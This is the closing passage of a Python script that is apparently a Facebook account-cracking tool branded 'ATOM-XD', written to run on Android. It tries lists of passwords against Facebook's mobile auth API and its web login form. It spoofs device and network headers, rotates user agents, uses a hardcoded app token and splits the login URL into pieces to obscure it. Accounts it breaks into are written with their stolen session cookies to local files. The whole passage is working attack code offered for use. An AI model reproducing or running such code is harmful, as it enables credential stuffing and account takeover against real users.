            "advertiser_id": str(uuid.uuid4()),
            'generate_analytics_claims':'1',
            'credentials_type':'password',
            'source':'login',
            "sim_country": "id",
            "network_country": "id",
            "relative_url": "method/auth.login",
            'error_detail_type':'button_with_disabled',
            'enroll_misauth':'false',
            'generate_session_cookies':'1',
            'generate_machine_id':'1',
            "locale":"en_GB","client_country_code":"GB",
            'fb_api_req_friendly_name':'authenticate',
            "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",} 
            head = {
            'Authorization':f'OAuth {accessToken}',
            "X-FB-Connection-Type": "mobile.CTRadioAccessTechnologyLTE",
            "X-FB-Connection-Bandwidth": str(random.randint(2000000, 4000000)),
            "X-FB-Net-HNI": str(random.randint(20000, 40000)),
            "X-FB-SIM-HNI": str(random.randint(20000, 40000)),
            'X-FB-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
            'X-FB-device-group': str(random.randint(2000, 4000)),
            "X-FB-Friendly-Name": "ViewerReactionsMutation",
            "X-FB-Request-Analytics-Tags": "graphservice",
            'X-FB-Friendly-Name':'authenticate',
            'X-FB-Connection-Type':'unknown',
            'X-FB-connection-quality':'EXCELLENT',
            "X-Tigon-Is-Retry": "False",
            'User-Agent': ua,
            "X-FB-connection-token": "d29d67d"+"37eca387482a"+"8a5b740f84f62",
            'Accept-Encoding':'gzip, deflate',
            'Content-Type': 'application/x-www-form-urlencoded',
            "X-FB-Client-IP": "True",
            "X-FB-Server-Cluster": "True",
            'X-FB-HTTP-Engine': 'Liger'
            }
            url = "https:"+"//b-"+"api.face"+"book.co"+"m/meth"+"od/a"+"uth.login"
            po = requests.post(url,data=data,headers=head).text
            q = json.loads(po)
            if 'session_key' in q:
                ckkk = ";".join(i["name"]+"="+i["value"] for i in result["session_cookies"])
                uid=str(q['uid'])
                ckk = f'https://graph.facebook.com/{uid}/picture?type=normal'
                res = requests.get(ckk).text
                if 'Photoshop' in res:
                    print(f"\r\r{red}[{white}√{red}] {red}[{green}ALIVE{red}] {green}{uid} {white}| {green}{pas} ")
                    oks.append(ids)
                    open('/sdcard/ATOM-M3-RN-LIVE.txt','a').write(uid+'|'+pas+'|'+ckkk+'\n')
                    print(f"\r\r{red}[{white}√{red}] {red}[{green}COOKIE{red}]{green} ={white} {coki}")
                    break
            elif 'www.facebook.com' in q['error_msg']:
                cps.append(ids)
                print(f"\r\r{red}[{white}√{red}] {red}DIE {uid} | {pas} ")
                open('/sdcard/ATOM-RN-DIE.txt','a').write(ids+'|'+pas+'\n')
                break
            else:
                continue
        loop+=1
    except requests.exceptions.ConnectionError:
        time.sleep(10)
    except Exception as e:
        pass

#====================[RANDOM M4]==========================
def randm3(ids,psd,tl):
    global loop,oks,cps
    abir = random.choice(["\x1b[38;5;196m","\x1b[38;5;208m","\033[1;30m","\x1b[38;5;160m","\x1b[38;5;46m","\033[1;33m","\033[38;5;6m","\033[1;35m","\033[1;36m","\033[1;37m"])
    sys.stdout.write(f"\r{red}[{white}√{red}] {red}[{abir}ATOM-XD{red}] {red}[{cyan}{loop}{red}] {red}[{green}OK{white}-{green}{len(oks)}{red}] {red}[{white}{'{:.1%}'.format(loop/int(tl))}{red}]"),
    sys.stdout.flush()
    session=requests.Session()
    try:
        for pas in psd:
            accessToken = "350685531728|62f8ce9f74b12f84c123cc23437a4a32" 
            free_fb = session.get('https://m.facebook.com').text
            pas = rmpassconf(ids,pas)
            ua =random.choice(ugen1)
            info={'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1), 'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1), 'email': ids, 'login_source': 'comet_headerless_login', 'next': '', 'encpass': '#PWD_BROWSER:0:{}:{}'.format(re.search('name="m_ts" value="(.*?)"',str(free_fb)).group(1),pas),}
            headers = {
    'HOST': 'm.facebook.com',
    'method': 'GET',
    'Authorization':f'OAuth {accessToken}',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'max-age=0',    
    'dpr': '1.4375',
    'sec-ch-prefers-color-scheme': 'light',
    'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
    'sec-ch-ua-full-version-list': '"Chromium";v="137.0.7337.0", "Not/A)Brand";v="24.0.0.0"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-model': '""',
    'sec-ch-ua-platform': '"Linux"',
    'sec-ch-ua-platform-version': '""',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': ua,
    'viewport-width': '980',
}
            session.post(url=f"https://m.facebook.com/login/",data=info,headers=headers).text
            log_cookies=session.cookies.get_dict().keys()
            if "c_user" in log_cookies:
                ckkk = ";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                uid = re.findall('c_user=(.*);xs', ckkk)[0]
                ckk = f'https://graph.facebook.com/{uid}/picture?type=normal'
                res = requests.get(ckk).text
                if 'Photoshop' in res:
                    print(f"\r\r{red}[{white}√{red}] {red}[{green}ALIVE{red}] {green}{uid} {white}| {green}{pas} ")
                    print(f"\r\r{red}[{white}√{red}] {red}[{green}COOKIE{red}]{green} ={white} {coki}")
                    oks.append(ids)
                    open('/sdcard/ATOM-M4-RN-LIVE.txt','a').write(uid+'|'+pas+'|'+ckkk+'\n')
                    break
                else:pass
            if 'checkpoint' in log_cookies:
                print(f"\r\r{red}[{white}√{red}] {red}DIE {uid} | {pas} ")
                open('/sdcard/ATOM-RN-DIE.txt','a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
            else:
                continue
        loop+=1
    except requests.exceptions.ConnectionError:
        time.sleep(10)
    except Exception as e:
        pass                



if __name__ == "__main__":
    Get_Data().get()
 

    
